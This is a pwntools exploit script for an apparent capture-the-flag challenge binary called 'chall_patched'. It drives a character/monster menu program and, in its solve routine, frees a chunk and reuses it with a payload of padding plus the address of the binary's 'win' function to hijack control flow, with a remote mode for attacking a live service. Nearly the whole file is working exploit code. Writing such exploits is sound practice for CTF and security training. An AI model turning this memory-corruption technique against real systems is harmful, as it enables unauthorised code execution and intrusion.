#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('chall_patched')
context.terminal = ['xfce4-terminal', '--title=GDB', '--zoom=0', '--geometry=128x50+1100+0', '-e']
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/home/app/chall"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-gef
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()

def generate_c(idx, name, profile):
    io.sendlineafter(b">>", b"1")
    io.sendlineafter(b":", str(idx).encode())
    io.sendlineafter(b">>", b"2")
    io.sendlineafter(b":", str(idx).encode())
    io.sendafter(b":", name)
    io.sendafter(b":", profile)


def generate_m():
    io.sendlineafter(b">>", b"4")

def slay_m(idx):
    io.sendlineafter(b">>", b"5")
    io.sendlineafter(b":", str(idx).encode())

def delete_c(idx):
    io.sendlineafter(b">>", b"3")
    io.sendlineafter(b":", str(idx).encode())

def solve():

    generate_c(1, b"A"*8, b"B"*8)
    generate_c(2, b"A"*8, b"B"*(8*5) + p64(exe.sym["win"]))
    delete_c(2)
    generate_m()
    slay_m(1)

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

